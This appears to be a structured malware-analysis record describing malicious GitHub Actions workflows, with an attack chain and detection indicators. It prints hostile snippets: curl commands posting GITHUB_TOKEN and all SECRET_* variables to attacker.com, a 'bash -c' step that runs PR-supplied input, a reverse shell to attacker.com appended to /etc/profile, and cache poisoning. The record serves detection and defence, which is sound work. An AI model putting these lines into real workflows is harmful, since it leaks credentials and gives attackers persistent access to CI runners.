package_info.package_versions: N/A (applies to workflow YAML definitions, not versioned packages)
package_info.why_malicious: The entire workflow is considered malicious because it is designed to exfiltrate secrets, abuse privileged tokens, inject arbitrary code, and compromise build artifacts or self-hosted runners by leveraging the flexibility and permissions of CI/CD pipeline definitions. Attackers can modify or introduce workflow files to execute code with elevated privileges, access sensitive secrets, and pivot to other resources.

malicious_snippets.code_snippet:
steps:
  - name: Exfiltrate secrets
    run: |
      curl -X POST -d "token=$GITHUB_TOKEN" https://attacker.com/exfil
malicious_snippets.code_behavior: On pull_request_target event, the code reads the GITHUB_TOKEN environment variable and sends its value to an external attacker-controlled domain via HTTP POST, enabling credential exfiltration.

malice_analysis.why_suspicious: This behavior is suspicious because it exfiltrates sensitive tokens to an external server, which is not a legitimate part of any build or test process.
malice_analysis.violated_expectations: Normal workflows should never send secrets or tokens to external, untrusted domains. Legitimate workflows use tokens only for internal API calls or artifact publishing.
malice_analysis.similar_legitimate_use: A legitimate workflow might use curl to upload build artifacts to a trusted internal server, but never secrets to an unknown domain.
key_indicators: Use of curl or similar tools to send secrets externally
Accessing GITHUB_TOKEN or other secrets in workflow steps

malicious_snippets.code_snippet:
steps:
  - name: Validate PR
    run: |
      bash -c "$INPUT_FROM_PR"
malicious_snippets.code_behavior: On workflow_run or pull_request event, the code executes user-controlled input (e.g., PR title or comment) as a shell command, allowing arbitrary code execution.

malice_analysis.why_suspicious: This is suspicious because it allows untrusted user input to be executed as code, which is a classic injection vulnerability.
malice_analysis.violated_expectations: Validation scripts should sanitize and validate all user input, never directly executing it.
malice_analysis.similar_legitimate_use: Legitimate workflows may use user input for configuration, but only after strict validation and sanitization.
key_indicators: Direct execution of variables derived from user input
Use of bash -c or similar constructs with untrusted data

execution_context.trigger: push to unprotected branch / draft pull request

malicious_snippets.code_snippet:
steps:
  - name: Exfiltrate all secrets
    run: |
      for secret in $(env | grep SECRET_ | cut -d= -f1); do
        curl -X POST -d "$secret=${!secret}" https://attacker.com/exfil
      done
malicious_snippets.code_behavior: On push or draft PR, the code iterates over all environment variables matching SECRET_*, sending their values to an external domain, enabling mass secret exfiltration.

malice_analysis.why_suspicious: This is suspicious because it systematically exfiltrates all secrets available to the workflow, which is never a legitimate action.
malice_analysis.violated_expectations: Workflows should use secrets only for their intended internal purpose, not enumerate and transmit them externally.
malice_analysis.similar_legitimate_use: No legitimate use for exfiltrating all secrets; only internal use for deployment or publishing.
key_indicators: Enumeration of environment variables for secrets
Looping over secrets and sending them externally
Use of curl or similar tools in this context

malicious_snippets.code_snippet:
steps:
  - name: Install backdoor
    run: |
      echo 'bash -i >& /dev/tcp/attacker.com/4444 0>&1' >> /etc/profile
malicious_snippets.code_behavior: On workflow execution on a self-hosted runner, the code appends a reverse shell command to /etc/profile, establishing persistent remote access for the attacker.

malice_analysis.why_suspicious: This is highly suspicious as it modifies system-wide profile files to establish a backdoor, which is a classic persistence technique.
malice_analysis.violated_expectations: Workflows should not modify system files or establish network listeners for remote shells.
malice_analysis.similar_legitimate_use: No legitimate use for this behavior in CI workflows.
key_indicators: Modification of /etc/profile or other system files

malicious_snippets.code_snippet:
steps:
  - name: Poison cache
    run: |
      echo 'malicious code' > ~/.cache/build-cache
malicious_snippets.code_behavior: During workflow execution, the code writes malicious data to the build cache, which may later be used by other workflows, enabling cache poisoning.

malice_analysis.why_suspicious: This is suspicious because it introduces untrusted data into shared caches, which can compromise subsequent builds.
malice_analysis.violated_expectations: Build caches should only contain trusted, validated data.
malice_analysis.similar_legitimate_use: Legitimate workflows may write to caches, but not with arbitrary or malicious content.
key_indicators: Writing arbitrary data to shared cache locations

attack_chain.action: Attacker gains access to modify or introduce a workflow file (e.g., via PR, branch push, or new repo).
attack_chain.leads_to: Malicious workflow is executed in CI environment.

attack_chain.action: Malicious workflow executes, exfiltrating secrets or tokens to attacker-controlled infrastructure.
attack_chain.leads_to: Attacker obtains credentials for further compromise.

attack_chain.action: Workflow executes user-controlled input as code, enabling arbitrary code execution.
attack_chain.leads_to: Attacker can run arbitrary commands in CI environment.

attack_chain.action: On self-hosted runners, workflow installs persistent backdoor for ongoing access.
attack_chain.leads_to: Attacker maintains access to runner host.

attack_chain.action: Workflow poisons build cache with malicious data.
attack_chain.leads_to: Subsequent builds may be compromised by poisoned cache.

behavioral_signatures: Workflow steps that access and transmit secrets or tokens to external domains
Execution of user-controlled input as shell commands
Modification of system files (e.g., /etc/profile) from workflow steps
Writing arbitrary data to shared build caches
file_indicators: .github/workflows/* with suspicious run steps (curl, bash -c, reverse shell patterns)
Workflows that enumerate environment variables for secrets
Workflows that modify /etc/profile or other system files
network_indicators: Outbound HTTP/HTTPS requests to non-corporate or untrusted domains (e.g., attacker.com, webhook.site)
Reverse shell connections to external IPs/ports
Unexpected API calls using GITHUB_TOKEN or PAT to external services
detection_knowledge.how_to_detect: Monitor workflow YAML files for steps that access secrets or environment variables and transmit them externally, especially using curl or similar tools. Flag workflows that execute user input as code, modify system files, or write to shared caches without validation. Monitor network traffic from CI runners for connections to untrusted domains or IPs. Use static analysis to detect suspicious patterns in workflow definitions and enforce least privilege on workflow permissions.
